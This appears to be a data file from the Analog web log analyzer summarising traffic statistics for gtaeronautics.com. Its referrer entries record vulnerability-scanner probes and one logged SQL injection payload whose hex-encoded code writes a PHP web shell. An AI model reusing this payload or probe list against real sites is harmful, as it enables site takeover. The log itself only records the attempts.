x	VE	analog 5.24
x	HN	gtaeronautics.com
I	lRS	1	481	2	/user.php
I	lRS	1	457	2	/pridpass.html
I	lRS	1	326	1	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	310	1	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	284651	85	[not listed: 21525]
L	*FR	2007	12	11	00	52
L	*LR	2021	07	02	23	14
L	*f	-20S	s
L	RS	56	56	139.159.139.52
L	RS	17	17	20.55.240.114
L	RS	57	9	5.188.210.4
L	RS	22	7	66.249.70.96
L	RS	7	7	34.194.45.108
L	RS	52	6	114.119.136.128
L	RS	34	5	40.77.167.40
L	RS	24	5	40.76.244.110
L	RS	5	5	117.28.19.93
L	RS	4	4	104.196.127.152
L	RS	4	4	34.73.138.8
L	RS	58	4	114.119.140.71
L	RS	65	4	114.119.142.73
L	RS	10	4	66.249.70.126
L	RS	11	4	66.249.64.233
L	RS	8	3	66.249.64.235
L	RS	3	3	194.5.53.140
L	RS	71	3	114.119.152.56
L	RS	3	3	149.56.150.112
L	RS	3	3	149.56.150.80
L	RS	400808	243	[not listed: 73649]
K	*FR	2013	12	22	04	20
K	*LR	2021	07	02	10	50
K	*f	-30S	s
K	lRS	1	126	9	http://www.gtaeronautics.com//index.php
K	lRS	1	1193	8	http://www.gtaeronautics.com//plus/mytag_js.php
K	lRS	1	28	4	http://www.gtaeronautics.com//plus/download.php
K	lRS	1	4	3	http://www.gtaeronautics.com//plus/erraddsave.php
K	lRS	1	164	3	http://www.gtaeronautics.com//plus/ad_js.php
K	lRS	1	832	2	http://gtaeronautics.com/
K	lRS	1	14	1	http://www.gtaeronautics.com//plus/myjs.php
K	lRS	1	1	1	http://www.gtaeronautics.com//Plugin/ueditor/net/controller.ashx
K	lRS	1	14	1	http://www.gtaeronautics.com//robots.php
K	lRS	1	199	1	554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/+union+select+1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10--+-";s:2:"id";s:3:"'/*";}
K	lRS	1	21	1	http://www.gtaeronautics.com//robots1.php
K	lRS	1	831	1	http://www.gtaeronautics.com//
K	lRS	1	15	1	http://www.gtaeronautics.com//install/index.php.bak
K	lRS	1	9	1	http://www.gtaeronautics.com//type.php
K	lRS	1	2	1	http://www.gtaeronautics.com//FCKeditor/editor/filemanager/connectors/asp/connector.asp
K	lRS	1	1	1	http://www.gtaeronautics.com//Controls/Ueditor/net/controller.ashx
K	lRS	1	16	1	http://www.gtaeronautics.com//12345.php
K	lRS	1	1	1	http://www.gtaeronautics.com//content/Ueditor/net/controller.ashx
K	lRS	1	18	1	https://www.bing.com/search
K	lRS	1	1	1	http://www.gtaeronautics.com//editor/Ueditor/net/controller.ashx
K	lRS	1	1	1	http://www.gtaeronautics.com//plus/digg_ajax.php
K	lRS	1	11	1	http://www.gtaeronautics.com//SiteServer/Ajax/ajaxOtherService.aspx
K	lRS	1	9	1	http://www.gtaeronautics.com//nuan.php
K	lRS	1	61	1	http://www.gtaeronautics.com//x.php
K	lRS	1	1	1	http://www.gtaeronautics.com//admin/Ueditor/net/controller.ashx
K	lRS	1	1	1	http://www.gtaeronautics.com//manager/Ueditor/net/controller.ashx
K	lRS	1	1	1	http://www.gtaeronautics.com//Scripts/ueditor/net/controller.ashx
K	lRS	1	11	1	http://www.gtaeronautics.com//utility/convert/index.php
K	lRS	1	1	1	http://www.gtaeronautics.com//include/dialog/select_images_post.php
K	lRS	1	1	1	http://www.gtaeronautics.com//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	47160	7	[not listed: 4845]
E	*FR	2008	01	06	10	12
E	*LR	2021	04	13	16	15
E	*f	-30S	s
E	lSR	1	0	180	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2021	04	13	16	15
l	*f	-20S	s
l	SR	0	180	[not listed: 99]
v	*f	-20B	b
v	Rb	657415	55.917	66.113.131.59
v	Rb	306025	44.083	64.41.87.40
R	*FR	2008	01	06	10	12
R	*LR	2021	04	13	16	15
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	2	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2021	07	02	23	14
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	98716	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2021	05	11	22	50
P	*LR	2021	07	02	23	57
P	R	21	0
P	R	0	<= 0.01
P	R	520	0.01-0.02
P	R	25159	0.02-0.05
P	R	57863	0.05-0.1 
P	R	72992	0.1 -0.2 
P	R	72226	0.2 -0.5 
P	R	36488	0.5 -1   
P	R	19451	1-  2 
P	R	8381	2-  5 
P	R	4856	5- 10 
P	R	1821	10- 20 
P	R	5560	20- 60 
P	R	569	60-120 
P	R	99	120-300 
